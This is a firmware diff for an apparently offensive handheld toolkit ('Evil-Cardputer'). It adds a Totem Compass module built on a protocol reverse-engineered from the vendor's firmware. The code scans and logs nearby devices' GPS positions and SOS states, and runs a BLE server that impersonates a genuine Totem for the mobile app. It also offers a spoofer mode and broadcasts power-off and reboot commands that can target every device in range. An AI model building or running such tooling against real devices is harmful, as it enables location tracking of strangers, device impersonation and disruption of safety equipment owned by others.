+    m[28] = TOTEM_DG_COLORS[totem_dg_color][2];
+    for (int r = 0; r < 3; r++) { totem_send(TOTEM_BCAST, m, 29); delay(120); }
+}
+void totem_send_dg_power(uint8_t mode) {
+    uint8_t m[29] = {0xA7, 0x74, 1, 6};
+    m[4] = mode; m[5] = (uint8_t)TOTEM_DG_RSSI_MIN; m[6] = TOTEM_DG_DELAY_SEC;
+    memcpy(m + 11, TOTEM_ZERO, 6); // target MAC (all = broadcast)
+    totemPutI32(m, 17, 0); totemPutI32(m, 21, -1); totemPutI32(m, 25, -1);
+    for (int r = 0; r < 3; r++) { totem_send(TOTEM_BCAST, m, 29); delay(120); }
+}
+
+// ── Smart Groups (cat=7) ──
+void totem_send_group_join(uint16_t uid) {
+    uint8_t b[16] = {0xA7, 0x74, 7, 1};
+    totemPutU16(b, 4, uid); b[6] = 1;
+    float lat = gps.location.isValid() ? gps.location.lat() : 0;
+    float lon = gps.location.isValid() ? gps.location.lng() : 0;
+    totemPutF(b, 7, lat); totemPutF(b, 11, lon); b[15] = 0xFF;
+    totem_send(TOTEM_BCAST, b, 16); delay(200); totem_send(TOTEM_BCAST, b, 16);
+}
+void totem_handle_smart_group(const TotemRxFrame& f) {
+    if (f.len < 21 || f.data[3] != 0) return;
+    int8_t instr = (int8_t)f.data[14]; uint16_t uid = totemGetU16(f.data, 15);
+    int cnt = (int8_t)f.data[17]; uint16_t timeout = totemGetU16(f.data, 19);
+    if (cnt < 0 || 21 + cnt * 16 > (int)f.len) return;
+    bool mine = false;
+    for (int i = 0; i < cnt; i++) if (memcmp(f.data + 21 + i * 16, totem_my_mac, 6) == 0) mine = true;
+    if (instr == -1) { totem_group_uid = 0; totem_group_until = 0; return; }
+    if (instr == 1) {
+        if (mine) { totem_group_uid = uid; totem_group_until = millis() + timeout; }
+        else if (!totem_group_uid && f.rssi >= TOTEM_SMART_GROUP_RSSI) totem_send_group_join(uid);
+        return;
+    }
+    if (instr == 3 && mine) {
+        for (int i = 0; i < cnt; i++) {
+            const uint8_t* e = f.data + 21 + i * 16;
+            if (memcmp(e, totem_my_mac, 6) == 0) continue;
+            int p = totem_find_peer(e); if (p < 0) continue;
+            totem_peers[p].lat = totemGetF(e, 6); totem_peers[p].lon = totemGetF(e, 10);
+            if (!totem_peers[p].bonded) totem_stats.bonds++;
+            totem_peers[p].bonded = true; totem_add_espnow_peer(e);
+        }
+        totem_group_uid = uid; totem_group_until = millis() + timeout;
+        totem_save_bonds();
+    }
+}
+
+// ── ESP-NOW RX callback (tiny — just enqueue) ──
+
+static volatile int8_t totem_last_rssi = -127;
+
+void totem_promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
+    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
+    totem_last_rssi = pkt->rx_ctrl.rssi;
+}
+
+void totem_espnow_recv_cb(const uint8_t* mac, const uint8_t* data, int len) {
+    if (!totem_rx_queue || !mac || !data || len <= 0 || len > 250) return;
+    TotemRxFrame frame = {};
+    memcpy(frame.mac, mac, 6);
+    frame.rssi = totem_last_rssi;
+    frame.receivedAt = millis();
+    frame.len = (uint16_t)len;
+    memcpy(frame.data, data, len);
+    xQueueSend(totem_rx_queue, &frame, 0);
+}
+
+// ── Bonding ──
+
+void totem_complete_bond(const uint8_t* mac) {
+    totem_add_espnow_peer(mac);
+    int idx = totem_find_peer(mac);
+    if (idx >= 0) totem_peers[idx].bonded = true;
+    totem_stats.bonds++;
+    totem_bond_latched = false;
+    totem_pair_until = 0;
+    char ms[18];
+    snprintf(ms, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    Serial.printf("[TOTEM] BONDED %s\n", ms);
+    totem_save_bonds();
+}
+
+void totem_handle_pair(int p, uint8_t ack, int8_t rssi) {
+    if (millis() < totem_group_until) return; // blocked during smart group
+    if (p < 0 || totem_peers[p].bonded) return;
+    totem_stats.pairRx++;
+    if (rssi < TOTEM_BONDING_RSSI && rssi != -127) return;
+    unsigned long now = millis();
+    if (now >= totem_pair_until) {
+        totem_pair_until = now + TOTEM_PAIR_SECS * 1000;
+        Serial.printf("[TOTEM] Auto-armed pairing\n");
+    }
+    if (now >= totem_pair_until) return;
+    if (!totem_bond_latched) {
+        memcpy(totem_bond_mac, totem_peers[p].mac, 6);
+        totem_bond_latched = true;
+        totem_add_espnow_peer(totem_bond_mac);
+        Serial.printf("[TOTEM] Latched peer\n");
+        // NO immediate ACK here — fall through to ack/else below (ref convention)
+    }
+    if (totem_bond_latched && memcmp(totem_peers[p].mac, totem_bond_mac, 6) == 0) {
+        if (ack) {
+            totem_complete_bond(totem_peers[p].mac);
+        } else {
+            totem_send_pair_beacon(totem_peers[p].mac, true);
+        }
+    }
+}
+
+// ── RX handler (called from main loop, not ISR) ──
+
+void totem_handle_rx(const TotemRxFrame& f) {
+    if (f.len < 4 || f.data[0] != 0xA7 || f.data[1] != 0x74) return;
+    totem_stats.rx++;
+    uint8_t cat = f.data[2], cmd = f.data[3];
+
+    int p = totem_find_peer(f.mac);
+    if (p < 0) return;
+    TotemPeer& peer = totem_peers[p];
+    peer.rssi = f.rssi;
+    peer.cat = cat;
+    peer.last_seen = millis();
+    peer.active = true;
+
+    if (cat == 0 && f.len >= 19) {
+        peer.lat = totemGetF(f.data, 4);
+        peer.lon = totemGetF(f.data, 8);
+        peer.sos = f.data[16];
+        if (f.len >= 72 && f.data[70] > 0 && f.data[70] <= 20) {
+            uint8_t n = f.data[70];
+            if (71 + n <= f.len) {
+                memcpy(peer.name, f.data + 71, n);
+                peer.name[n] = 0;
+            }
+        }
+        if (cmd == 1) {
+            uint8_t ack = (f.len > 18) ? f.data[18] : 0;
+            totem_handle_pair(p, ack, f.rssi);
+        }
+        if (gps.location.isValid() && (peer.lat != 0 || peer.lon != 0)) {
+            float myLat = gps.location.lat(), myLon = gps.location.lng();
+            peer.distance = totem_get_distance(myLat, myLon, peer.lat, peer.lon);
+            peer.bearing = totem_get_azimuth(myLat, myLon, peer.lat, peer.lon);
+        }
+    }
+
+    if (cat == 2 && f.len >= 35) {
+        const uint8_t* origin = f.data + 4;
+        if (memcmp(origin, totem_my_mac, 6) != 0) {
+            int oi = totem_find_peer(origin);
+            if (oi >= 0) {
+                totem_peers[oi].lat = totemGetF(f.data, 10);
+                totem_peers[oi].lon = totemGetF(f.data, 14);
+                totem_peers[oi].sos = f.data[19];
+                totem_peers[oi].hops = f.data[29];
+                totem_peers[oi].cat = 2;
+                totem_peers[oi].active = true;
+                totem_peers[oi].last_seen = millis();
+                if (f.data[29] == 0) totem_peers[oi].rssi = f.rssi;
+            }
+        }
+        uint16_t tail = totemGetU16(f.data, 20);
+        uint8_t hop = f.data[29], maxHop = f.data[30];
+        if (!totem_seen_recent(tail) && hop + 1 < maxHop) {
+            uint8_t relay[250];
+            int rlen = min((int)f.len, 249);
+            memcpy(relay, f.data, rlen);
+            relay[29] = hop + 1;
+            if (f.len >= 43 && gps.location.isValid()) {
+                totemPutF(relay, 35, gps.location.lat());
+                totemPutF(relay, 39, gps.location.lng());
+            }
+            if (totem_send(TOTEM_BCAST, relay, rlen)) totem_stats.relayed++;
+        }
+    }
+
+    // Demi-God Find (cat=1, cmd=5)
+    if (cat == 1 && cmd == 5) { totem_handle_find(f); }
+    // Smart Groups (cat=7)
+    if (cat == 7) { totem_handle_smart_group(f); }
+    // Extensions (cat=0x7E) — capabilities
+    if (cat == TOTEM_EXT_CATEGORY) { totem_handle_extension(f); }
+
+    Serial.printf("[TOTEM] rx %02X:%02X:%02X:%02X cat=%u cmd=%u rssi=%d\n",
+                  f.mac[2], f.mac[3], f.mac[4], f.mac[5], cat, cmd, f.rssi);
+}
+
+// ── BLE Totem: GATT server impersonating real Totem for mobile app ──
+// Protocol reverse-engineered from firmware_v4.2.4.bin
+// UUIDs: 7913b588-{0000,0001,0002}-4635-b066-baa2cfc197cf
+
+void totem_ble_notify_data(const uint8_t* data, size_t len) {
+    if (!totem_ble_tx_queue || !data || !len || len > 250) return;
+    TotemBleFrame frame{};
+    frame.len = len;
+    memcpy(frame.data, data, len);
+    xQueueSend(totem_ble_tx_queue, &frame, 0);
+}
+
+void totem_ble_tx_worker(void*) {
+    TotemBleFrame frame{};
+    for (;;) {
+        if (!totem_ble_tx_queue || xQueueReceive(totem_ble_tx_queue, &frame, portMAX_DELAY) != pdTRUE) continue;
+        if (!totem_ble_connected || !totem_ble_data_char || !frame.len) continue;
+        totem_ble_data_char->setValue(frame.data, frame.len);
+        if (totem_ble_frame_schema) totem_ble_data_char->indicate();
+        else totem_ble_data_char->notify();
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+}
+
+size_t totem_ble_build_static(uint8_t* b) {
+    const char* name = TOTEM_DEVICE_NAME;
+    size_t nameLen = min((size_t)strlen(name), (size_t)20);
+    const char branch[] = "totem";
+    size_t branchLen = 5;
+    size_t len = 43 + nameLen + branchLen;
+    memset(b, 0, len);
+    b[0] = 1; b[1] = 2; b[2] = (uint8_t)len;
+    memcpy(b + 3, totem_my_mac, 6);
+    b[16] = 5; b[17] = 0; b[18] = 1;
+    b[40] = (uint8_t)nameLen; b[41] = (uint8_t)branchLen; b[42] = 0;
+    memcpy(b + 43, name, nameLen);
+    memcpy(b + 43 + nameLen, branch, branchLen);
+    return len;
+}
+
+size_t totem_ble_build_peer_ping(const TotemPeer& p, uint8_t* b) {
+    const char* name = p.name[0] ? p.name : "unknown";
+    size_t nameLen = min((size_t)strlen(name), (size_t)20);
+    size_t len = 53 + nameLen;
+    memset(b, 0, len);
+    b[0] = 6; b[1] = 2; b[2] = (uint8_t)len;
+    memcpy(b + 3, p.mac, 6);
+    b[9] = p.hops;
+    totemPutF(b, 10, p.lat); totemPutF(b, 14, p.lon);
+    b[18] = 0xFF; b[19] = 0xFF;
+    int16_t neg1 = -1; memcpy(b + 20, &neg1, 2);
+    b[22] = p.sos ? 1 : 0;
+    b[24] = 80; b[25] = 0xFF;
+    b[28] = (uint8_t)nameLen; b[29] = (uint8_t)p.rssi;
+    memcpy(b + 50, name, nameLen);
+    b[50 + nameLen] = 0xFF;
+    return len;
+}
+
+size_t totem_ble_build_peer_sync(uint8_t* b, size_t maxLen) {
+    memset(b, 0, maxLen);
+    b[0] = 6; b[1] = 7;
+    size_t offset = 4;
+    uint8_t count = 0;
+    for (int i = 0; i < totem_peer_count; i++) {
+        if (!totem_peers[i].bonded || offset + 6 > maxLen) continue;
+        memcpy(b + offset, totem_peers[i].mac, 6);
+        offset += 6;
+        count++;
+    }
+    b[2] = (uint8_t)offset; b[3] = count;
+    return offset;
+}
+
+void totem_ble_send_peer_list() {
+    uint32_t now = millis();
+    if (totem_ble_last_peer_sync && (int32_t)(now - totem_ble_last_peer_sync) < 2000) return;
+    totem_ble_last_peer_sync = now;
+    uint8_t b[200];
+    size_t syncLen = totem_ble_build_peer_sync(b, sizeof(b));
+    totem_ble_notify_data(b, syncLen);
+    for (int i = 0; i < totem_peer_count; i++) {
+        if (!totem_peers[i].bonded) continue;
+        totem_ble_notify_data(b, totem_ble_build_peer_ping(totem_peers[i], b));
+    }
+}
+
+void totem_ble_handle_bond(const TotemBleFrame& frame) {
+    if (frame.len < 53) return;
+    const uint8_t* mac = frame.data + 3;
+    if (memcmp(mac, TOTEM_ZERO, 6) == 0 || memcmp(mac, TOTEM_BCAST, 6) == 0) return;
+    int p = totem_find_peer(mac);
+    if (p < 0 && totem_peer_count < TOTEM_MAX_PEERS) {
+        p = totem_peer_count++;
+        memset(&totem_peers[p], 0, sizeof(TotemPeer));
+        memcpy(totem_peers[p].mac, mac, 6);
+        totem_peers[p].active = true;
+    }
+    if (p < 0) return;
+    totem_peers[p].lat = totemGetF(frame.data, 9);
+    totem_peers[p].lon = totemGetF(frame.data, 13);
+    totem_peers[p].sos = frame.data[32] & 1;
+    uint8_t nameLen = min((uint8_t)(frame.data[52]), (uint8_t)20);
+    if ((size_t)(53 + nameLen) <= frame.len) {
+        memcpy(totem_peers[p].name, frame.data + 53, nameLen);
+        totem_peers[p].name[nameLen] = 0;
+    }
+    totem_add_espnow_peer(mac);
+    if (!totem_peers[p].bonded) totem_stats.bonds++;
+    totem_peers[p].bonded = true;
+    totem_save_bonds();
+    Serial.printf("[BLE-TOTEM] APP BONDED %02X:%02X:%02X:%02X:%02X:%02X\n",
+                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+}
+
+void totem_ble_handle_frame(const TotemBleFrame& frame) {
+    if (frame.len < 2) return;
+    uint8_t cat = frame.data[0], cmd = frame.data[1];
+    Serial.printf("[BLE-TOTEM] rx cat=%u cmd=%u len=%u\n", cat, cmd, frame.len);
+    if (cat == 0 && cmd == 1) {
+        totem_ble_conn_mode = frame.len >= 3 ? frame.data[2] : 0;
+        totem_ble_frame_schema = frame.len >= 4 ? frame.data[3] : 0;
+    } else if (cat == 1) {
+        totem_ble_static_requested = true;
+    } else if (cat == 12 && cmd == 3) {
+        uint8_t status = 3;
+        if (totem_ble_status_char) {
+            totem_ble_status_char->setValue(&status, 1);
+            totem_ble_status_char->notify();
+        }
+    } else if (cat == 6 && (cmd == 0 || cmd == 1 || cmd == 8)) {
+        totem_ble_send_peer_list();
+    } else if (cat == 6 && cmd == 6) {
+        totem_ble_handle_bond(frame);
+    } else if (cat == 6 && cmd == 3 && frame.len >= 12 && (frame.data[11] & 1)) {
+        int p = totem_find_peer(frame.data + 2);
+        if (p >= 0) {
+            totem_peers[p].bonded = false;
+            esp_now_del_peer(totem_peers[p].mac);
+            totem_save_bonds();
+        }
+    }
+}
+
+class TotemBleServerCb : public BLEServerCallbacks {
+    void onConnect(BLEServer*) override {
+        totem_ble_connected = true;
+        totem_ble_conn_mode = 0;
+        totem_ble_frame_schema = 0;
+        totem_ble_last_peer_sync = 0;
+        if (totem_ble_status_char) {
+            uint8_t status = 3;
+            totem_ble_status_char->setValue(&status, 1);
+            totem_ble_status_char->notify();
+        }
+        Serial.println("[BLE-TOTEM] App connected");
+    }
+    void onDisconnect(BLEServer* server) override {
+        totem_ble_connected = false;
+        totem_ble_conn_mode = 0;
+        totem_ble_frame_schema = 0;
+        totem_ble_last_peer_sync = 0;
+        if (totem_ble_tx_queue) xQueueReset(totem_ble_tx_queue);
+        server->startAdvertising();
+        Serial.println("[BLE-TOTEM] App disconnected, re-advertising");
+    }
+};
+
+class TotemBleDataCb : public BLECharacteristicCallbacks {
+    void onWrite(BLECharacteristic* characteristic) override {
+        size_t len = characteristic->getLength();
+        if (!totem_ble_rx_queue || !len || len > 250) return;
+        TotemBleFrame frame{};
+        frame.len = len;
+        memcpy(frame.data, characteristic->getData(), len);
+        xQueueSend(totem_ble_rx_queue, &frame, 0);
+    }
+};
+
+TotemBleServerCb totem_ble_server_cb;
+TotemBleDataCb totem_ble_data_cb;
+
+static BLEServer*  totem_ble_server  = nullptr;
+static BLEService* totem_ble_service = nullptr;
+
+bool totem_start_ble() {
+    if (!isBLEInitialized) {
+        BLEDevice::init("totem");
+        isBLEInitialized = true;
+    } else {
+        esp_ble_gap_set_device_name("totem");
+    }
+    BLEDevice::setMTU(200);
+
+    if (!totem_ble_server) {
+        totem_ble_server = BLEDevice::createServer();
+        if (!totem_ble_server) { Serial.println("[BLE-TOTEM] createServer failed"); return false; }
+        totem_ble_server->setCallbacks(&totem_ble_server_cb);
+    }
+
+    if (!totem_ble_service) {
+        totem_ble_service = totem_ble_server->createService("7913b588-0000-4635-b066-baa2cfc197cf");
+        totem_ble_status_char = totem_ble_service->createCharacteristic(
+            "7913b588-0001-4635-b066-baa2cfc197cf",
+            BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE |
+            BLECharacteristic::PROPERTY_WRITE_NR | BLECharacteristic::PROPERTY_NOTIFY |
+            BLECharacteristic::PROPERTY_INDICATE);
+        totem_ble_data_char = totem_ble_service->createCharacteristic(
+            "7913b588-0002-4635-b066-baa2cfc197cf",
+            BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE |
+            BLECharacteristic::PROPERTY_WRITE_NR | BLECharacteristic::PROPERTY_NOTIFY |
+            BLECharacteristic::PROPERTY_INDICATE);
+        totem_ble_status_char->addDescriptor(new BLE2902());
+        totem_ble_data_char->addDescriptor(new BLE2902());
+        totem_ble_status_char->setCallbacks(&totem_ble_data_cb);
+        totem_ble_data_char->setCallbacks(&totem_ble_data_cb);
+        totem_ble_service->start();
+        Serial.println("[BLE-TOTEM] Service created (once)");
+    } else {
+        totem_ble_service->start();
+    }
+
+    if (!totem_ble_rx_queue) totem_ble_rx_queue = xQueueCreate(8, sizeof(TotemBleFrame));
+    if (!totem_ble_tx_queue) totem_ble_tx_queue = xQueueCreate(16, sizeof(TotemBleFrame));
+    if (totem_ble_tx_queue && !totem_ble_tx_task)
+        xTaskCreatePinnedToCore(totem_ble_tx_worker, "ble-totem-tx", 4096, nullptr, 1, &totem_ble_tx_task, 0);
+    BLEAdvertising* adv = BLEDevice::getAdvertising();
+    adv->addServiceUUID("7913b588-0000-4635-b066-baa2cfc197cf");
+    adv->setAppearance(1361);
+    adv->setScanResponse(true);
+    adv->setMinPreferred(0x06);
+    BLEDevice::startAdvertising();
+    totem_ble_active = true;
+    Serial.println("[BLE-TOTEM] Advertising: name=totem svc=7913b588 appearance=1361");
+    return true;
+}
+
+void totem_service_ble() {
+    TotemBleFrame frame;
+    while (totem_ble_rx_queue && xQueueReceive(totem_ble_rx_queue, &frame, 0) == pdTRUE)
+        totem_ble_handle_frame(frame);
+    if (!totem_ble_static_requested || !totem_ble_data_char) return;
+    totem_ble_static_requested = false;
+    uint8_t data[80];
+    size_t len = totem_ble_build_static(data);
+    totem_ble_notify_data(data, len);
+}
+
+void totem_stop_ble() {
+    if (!totem_ble_active) return;
+    totem_ble_active = false;
+    totem_ble_connected = false;
+    if (totem_ble_tx_task) { vTaskDelete(totem_ble_tx_task); totem_ble_tx_task = nullptr; }
+    if (totem_ble_rx_queue) { vQueueDelete(totem_ble_rx_queue); totem_ble_rx_queue = nullptr; }
+    if (totem_ble_tx_queue) { vQueueDelete(totem_ble_tx_queue); totem_ble_tx_queue = nullptr; }
+    BLEDevice::getAdvertising()->stop();
+    if (totem_ble_service) totem_ble_service->stop();
+    Serial.println("[BLE-TOTEM] Stopped (server/service kept for reuse)");
+}
+
+// ── Menu ──
+
+// ══════════════════════════════════════════════════════════════════════════
+// Totem Compass — Full UI Rewrite for Evil-Cardputer
+// Ported from TotemCardputer(1).ino reference (2566 lines) to Evil style
+// Replaces totemCompassMenu() — keeps ALL existing protocol helpers.
+//
+// Pages implemented (adapted from reference's 13 pages for 240x135 screen):
+//   PAGE_PEERS      — peer list, sorted by RSSI, j/k select
+//   PAGE_INFO       — selected peer details
+//   PAGE_DEMIGOD    — DG controls: find/off/reboot/venue, target mode
+//   PAGE_LOG        — last RX summary per peer
+//   PAGE_PAIR_DIAG  — pairing state machine diagnostics
+//   PAGE_CAPABILITIES — firmware/battery/capability per peer
+//   PAGE_RESULTS    — command ACK tracker (best-effort heard-after)
+//
+// Keys (matching reference exactly where possible):
+//   TAB  — cycle: PEERS → LOG → DEMIGOD → PEERS
+//   j/k  — scroll / select
+//   ENTER — peer info / confirm
+//   d    — DemiGod page (with selected peer as target)
+//   p    — arm pairing
+//   s    — toggle SOS
+//   q    — pair diagnostics
+//   z    — capabilities (sends query)
+//   y    — command results
+//   b/u  — bond / unbond selected peer
+//   l    — backlight toggle
+//   m    — mesh beacon manual send
+//   x    — clear non-bonded peers
+//   BACK — exit to main menu (from PEERS) or back one page
+//
+// DemiGod page keys:
+//   t    — cycle target: selected → ALL → GROUP → selected
+//   c    — cycle colour
+//   f    — find (flash target)
+//   o    — power off (double-press confirm)
+//   r    — reboot (double-press confirm)
+//
+// Entry mode menu with hardware check.
+// ══════════════════════════════════════════════════════════════════════════
+
+// Page enum (add at the top of Totem section, before totemCompassMenu)
+enum TotemPage : uint8_t {
+    TPAGE_PEERS, TPAGE_LOG, TPAGE_INFO, TPAGE_DEMIGOD,
+    TPAGE_PAIR_DIAG, TPAGE_CAPABILITIES, TPAGE_RESULTS,
+    TPAGE_BLE_STATUS, TPAGE_COMPASS
+};
+
+// DemiGod state
+struct TotemDgState {
+    bool all = false;
+    bool hasPeer = false;
+    uint8_t peer[6] = {};
+    uint8_t color = 0;
+    char pending = 0;
+    uint32_t pendingUntil = 0;
+};
+
+void totemCompassMenu() {
+    keyRelease();
+    const int W = 240, H = 135;
+
+    M5Canvas* sprite = new(std::nothrow) M5Canvas(&M5.Display);
+    bool use_sprite = false;
+    if (sprite) {
+        sprite->setColorDepth(8);
+        use_sprite = sprite->createSprite(W, H);
+    }
+    Serial.printf("[TOTEM] sprite=%s heap=%u\n", use_sprite ? "OK" : "FAIL", ESP.getFreeHeap());
+
+    WiFi.mode(WIFI_OFF);
+    delay(100);
+
+    if (!isBLEInitialized) {
+        BLEDevice::init("totem");
+        isBLEInitialized = true;
+    }
+
+    WiFi.mode(WIFI_STA);
+    WiFi.setSleep(isBLEInitialized);
+    esp_wifi_set_channel(TOTEM_CHANNEL, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_LR);
+    esp_wifi_config_espnow_rate(WIFI_IF_STA, WIFI_PHY_RATE_LORA_250K);
+    if (esp_now_init() != ESP_OK) {
+        M5.Display.clear(TFT_BLACK);
+        M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+        M5.Display.setCursor(10, 60); M5.Display.print("ESP-NOW init failed!");
+        M5.Display.display(); delay(2000);
+        totem_stop_ble();
+        esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+        WiFi.mode(WIFI_OFF);
+        if (sprite) { sprite->deleteSprite(); delete sprite; }
+        inMenu = true; return;
+    }
+    totem_rx_queue = xQueueCreate(24, sizeof(TotemRxFrame));
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(totem_promiscuous_rx_cb);
+    Serial.printf("[TOTEM] BLE+WiFi done heap=%u\n", ESP.getFreeHeap());
+    totem_peer_count = 0; totem_running = true; totem_sos = false;
+    totem_pair_until = 0; totem_bond_latched = false;
+    memset(&totem_stats, 0, sizeof(totem_stats));
+    totem_recent_cursor = 0;
+    memset(totem_recent, 0, sizeof(totem_recent));
+    memset(totem_peers, 0, sizeof(totem_peers));
+    totem_flash_until = 0; totem_group_uid = 0; totem_group_until = 0;
+    esp_now_register_recv_cb(totem_espnow_recv_cb);
+    totem_add_espnow_peer(TOTEM_BCAST);
+    if (esp_wifi_get_mac(WIFI_IF_STA, totem_my_mac) != ESP_OK || memcmp(totem_my_mac, "\0\0\0\0\0\0", 6) == 0)
+        esp_read_mac(totem_my_mac, ESP_MAC_WIFI_STA);
+    totem_load_bonds();
+    Serial.printf("[TOTEM] up: %02X:%02X:%02X:%02X:%02X:%02X LR/ch%d BLE=%s heap=%u\n",
+        totem_my_mac[0], totem_my_mac[1], totem_my_mac[2],
+        totem_my_mac[3], totem_my_mac[4], totem_my_mac[5], TOTEM_CHANNEL,
+        totem_ble_active ? "on" : "off(mode7)", ESP.getFreeHeap());
+    auto& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+
+    // ═══════════════ OUTER LOOP (mode selection) ═══════════════
+    const char* totem_items[] = {"Scanner", "Compass (Need GPS)", "Spoofer",
+        "DemiGod Controller", "Pair Manager", "Capabilities", "BLE App Status"};
+    const int totem_item_count = 7;
+    const int totem_lineH = 16;
+    const int totem_listY = 18;
+    const int totem_maxVis = (H - totem_listY - 14) / totem_lineH;
+    int totem_sel = 0, totem_start = 0;
+
+    while (true) {
+
+    // ── Entry mode selection ──
+    int mode = 0;
+    bool totem_need_draw = true;
+    while (!mode) {
+        if (totem_need_draw) {
+            if (totem_sel < totem_start) totem_start = totem_sel;
+            if (totem_sel >= totem_start + totem_maxVis) totem_start = totem_sel - totem_maxVis + 1;
+            uint16_t violet = sp.color565(148, 0, 211);
+            sp.fillScreen(TFT_BLACK);
+            sp.fillRect(0, 0, W, 16, 0x0841);
+            sp.drawFastHLine(0, 16, W, violet);
+            sp.setTextFont(1);
+            sp.setTextSize(1.5);
+            sp.setTextColor(violet, 0x0841); sp.setCursor(40, 2); sp.print("Totem Compass");
+            sp.setTextSize(1.5);
+            for (int i = 0; i < totem_maxVis && (totem_start + i) < totem_item_count; i++) {
+                int idx = totem_start + i;
+                int y = totem_listY + i * totem_lineH;
+                if (idx == totem_sel) {
+                    sp.fillRect(0, y, W, totem_lineH, TFT_NAVY);
+                    sp.setTextColor(TFT_GREEN, TFT_NAVY);
+                } else {
+                    sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                }
+                sp.setCursor(10, y + 2); sp.print(totem_items[idx]);
+            }
+            sp.fillRect(0, H - 14, W, 14, 0x0841);
+            sp.setTextSize(1);
+            sp.setTextColor(totem_ble_active ? TFT_GREEN : TFT_DARKGREEN, 0x0841);
+            sp.setCursor(4, H - 12); sp.printf("[%d peers] BLE:%s",
+                totem_peer_count, totem_ble_active ? (totem_ble_connected ? "CONN" : "ADV") : "off");
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(160, H - 12); sp.print(";/. ENT BACK");
+            if (use_sprite) sprite->pushSprite(0, 0);
+            totem_need_draw = false;
+        }
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); goto totem_cleanup; }
+        if (kp(';')) { totem_sel = (totem_sel - 1 + totem_item_count) % totem_item_count; totem_need_draw = true; delay(150); }
+        if (kp('.')) { totem_sel = (totem_sel + 1) % totem_item_count; totem_need_draw = true; delay(150); }
+        if (kp(KEY_ENTER)) { mode = totem_sel + 1; keyRelease(); }
+        delay(10);
+    }
+
+    // ── Mode 7: BLE Totem + ESP-NOW coex ──
+    // BLE controller was initialized BEFORE WiFi (at totemCompassMenu entry)
+    // so coex is properly configured — just switch WiFi LR→regular and start GATT
+    if (mode == 7) {
+        // Switch ESP-NOW from LR to regular WiFi for better BLE coex
+        esp_now_unregister_recv_cb();
+        esp_now_deinit();
+        esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+        esp_wifi_set_channel(TOTEM_CHANNEL, WIFI_SECOND_CHAN_NONE);
+        esp_now_init();
+        esp_now_register_recv_cb(totem_espnow_recv_cb);
+        totem_add_espnow_peer(TOTEM_BCAST);
+        totem_start_ble();
+        Serial.println("[TOTEM] BLE+WiFi coex active");
+        // Peers collected in modes 1-6 stay in totem_peers[] and are relayed to app
+        // (uses shared sprite from totemCompassMenu scope)
+        uint32_t lastDraw = 0;
+        while (true) {
+            M5.update(); cardUpdate();
+            totem_service_ble();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+            uint32_t now = millis();
+            if (now - lastDraw >= 100) {
+                lastDraw = now;
+                sp.fillScreen(TFT_BLACK);
+                uint16_t good = sp.color565(90, 255, 130);
+                sp.fillRect(0, 0, W, 13, 0x0841);
+                sp.setTextColor(0xFC00); sp.setCursor(2, 3);
+                sp.printf("TOTEM BLE %s", totem_ble_connected ? "LINKED" : "Advertising");
+                sp.drawFastHLine(0, 13, W, 0x03E0);
+                int y = 18;
+                sp.setTextColor(good);
+                sp.setCursor(2, y); sp.printf("App: %s", totem_ble_connected ? "CONNECTED" : "waiting..."); y += 11;
+                sp.setTextColor(TFT_WHITE);
+                int peerCount = 0, bondCount = 0;
+                for (int i = 0; i < TOTEM_MAX_PEERS; i++) {
+                    if (totem_peers[i].active) { peerCount++; if (totem_peers[i].bonded) bondCount++; }
+                }
+                sp.setCursor(2, y); sp.printf("Peers: %d  Bonded: %d", peerCount, bondCount); y += 11;
+                int shown = 0;
+                for (int i = 0; i < TOTEM_MAX_PEERS && shown < 5; i++) {
+                    if (!totem_peers[i].active) continue;
+                    uint32_t age = (now - totem_peers[i].last_seen) / 1000;
+                    sp.setTextColor(totem_peers[i].bonded ? good : TFT_LIGHTGREY);
+                    sp.setCursor(2, y);
+                    sp.printf("%s %ddBm %lus",
+                        totem_peers[i].name[0] ? totem_peers[i].name : "???",
+                        totem_peers[i].rssi, age);
+                    y += 10; shown++;
+                }
+                if (peerCount == 0) {
+                    sp.setTextColor(TFT_DARKGREY);
+                    sp.setCursor(2, y); sp.print("Scan peers in mode 1-6 first"); y += 10;
+                }
+                sp.fillRect(0, H-14, W, 14, 0x0841);
+                sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
+                sp.print("BACK=menu  BLE+ESP-NOW active");
+                if (use_sprite) sprite->pushSprite(0, 0);
+            }
+            delay(10);
+        }
+        // Stop BLE advertising, switch WiFi back to LR
+        totem_stop_ble();
+        esp_now_unregister_recv_cb();
+        esp_now_deinit();
+        esp_wifi_set_channel(TOTEM_CHANNEL, WIFI_SECOND_CHAN_NONE);
+        esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_LR);
+        esp_wifi_config_espnow_rate(WIFI_IF_STA, WIFI_PHY_RATE_LORA_250K);
+        esp_now_init();
+        esp_now_register_recv_cb(totem_espnow_recv_cb);
+        totem_add_espnow_peer(TOTEM_BCAST);
+        continue;
+    }
+
+    bool compass_mode = (mode == 2);
+    bool spoof_mode = (mode == 3);
+
+    // GPS check for compass mode
+    if (compass_mode && !gps.location.isValid()) {
+        M5.Display.clear(TFT_BLACK);
+        M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
